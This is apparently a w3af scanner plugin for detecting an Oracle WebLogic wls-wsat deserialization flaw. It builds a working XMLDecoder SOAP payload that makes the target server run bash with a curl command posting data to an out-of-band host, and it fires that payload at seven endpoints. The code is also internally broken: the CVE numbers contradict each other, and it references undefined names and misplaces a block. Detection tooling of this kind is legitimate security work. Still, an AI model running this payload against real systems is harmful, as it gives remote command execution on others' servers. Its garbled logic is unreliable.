from w3af.core.controllers.plugins.infrastructure_plugin import InfrastructurePlugin
from w3af.core.controllers.misc.decorators import runonce
from w3af.core.controllers.exceptions import RunOnce
from w3af.core.data.dc.headers import Headers
from w3af.core.data.request.fuzzable_http_request import FuzzableHTTPRequest
from w3af.core.data.options.option_list import OptionList
from w3af.core.data.options.opt_factory import opt_factory
from w3af.core.data.parsers.doc.url import URL

import json, random


class cve_2018_2628(InfrastructurePlugin):
	"""
	Detect CVE-2015-2628 (Oracle Weblogic Server Deserialization RCE)
	"""
	NAME = "CVE-2018-2628"
	
	def __init__(self):
		InfrastructurePlugin.__init__(self)
		self.oob_url = None

	def get_options(self):
		ol = OptionList()
		d1 = 'Out-of-band URL'
		o = opt_factory('oob_url', self.oob_url, d1, 'string')
		ol.add(o)
		return ol

	def set_options(self, options_list):
		url = options_list['oob_url'].get_value()
		if url:
			self.oob_url = URL(url) 

	def get_saved_oob_data(self, token):
		check_response = self.requestor.http.GET(self.oob_url, cache=False, grep=False).get_body()
		try:
			token = json.loads(check_response)["token"]
		except:
			return

	@staticmethod
	def gen_token():
		a = ''
		for i in range(32):
			a += str(random.randint(0,9))
		return a

	def prepare_payload(self, oob_data):
		command = "curl --data '{}' {}".format(json.dumps(oob_data), self.oob_url)
		html_escape_table = {
			"&": "&amp;",
			'"': "&quot;",
			"'": "&apos;",
			">": "&gt;",
			"<": "&lt;",
		}
		command_filtered = "<string>" + "".join(html_escape_table.get(c, c) for c in command) + "</string>"
		payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> \n" \
					"   <soapenv:Header> " \
					"	   <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> \n" \
					"		   <java version=\"1.8.0_151\" class=\"java.beans.XMLDecoder\"> \n" \
					"			   <void class=\"java.lang.ProcessBuilder\"> \n" \
					"				  <array class=\"java.lang.String\" length=\"3\">" \
					"					  <void index = \"0\">					   " \
					"						  <string>bash</string>				 " \
					"					  </void>									" \
					"					  <void index = \"1\">					   " \
					"						  <string>-c</string>				  " \
					"					  </void>									" \
					"					  <void index = \"2\">					   " \
					+ command_filtered + \
					"					  </void>									" \
					"				  </array>" \
					"				  <void method=\"start\"/>" \
					"				  </void>" \
					"			</java>" \
					"		</work:WorkContext>" \
					"   </soapenv:Header>" \
					"   <soapenv:Body/>" \
					"</soapenv:Envelope>"
		return payload

	@runonce(exc_class=RunOnce)
	def discover(self, fuzzable_http_request):
		url = fuzzable_http_request.get_url()
		endpoint_list = [ 'RegistrationPortTypeRPC', 'ParticipantPortType', 'RegistrationRequesterPortType', 'CoordinatorPortType11', 'RegistrationPortTypeRPC11', 'ParticipantPortType11', 'RegistrationRequesterPortType11' ]
		headers = Headers()
		headers["Content-Type"] = "application/xml"
		exploit_responses = {}
		tokens = {}
		payloads = {}

		# Send payload to all vulnerable endpoints
		for endpoint in endpoint_list:
			tokens[endpoint] = self.gen_token()
			payloads[endpoint] = self.prepare_payload(tokens[endpoint])
			exploit_url = url.url_join("/wls-wsat/" + endpoint)
			exploit_responses[endpoint] = self.requestor.http.POST(exploit_url, data=payloads[endpoint], headers=headers, cache=False, grep=False)

		# Check on attacker's server
		check_url = self.oob_url
		check_response = self.requestor.http.GET(check_url, cache=False, grep=False).get_body()
		try:
			token = json.loads(check_response)["token"]
		except:
			return
		else:
			for endpoint, sent_token in tokens.items():
				if sent_token == token:
					vuln_data = {
						"cmd": self.EXPLOIT_COMMAND,
						"token": match.group(1),
						"endpoint": endpoint,
					}

				mutant = FuzzableHTTPRequest.from_http_response(exploit_responses[endpoint])
				traffic_ids = exploit_responses[endpoint].id
				vuln = self.create_vuln("CVE-2017-10271 (Oracle WebLogic wls-wsat Component Deserialization RCE)", traffic_ids=traffic_ids, mutant=mutant, data=vuln_data)
				self.save_vuln(vuln, vuln_type="web_logic")
				return True
		return False
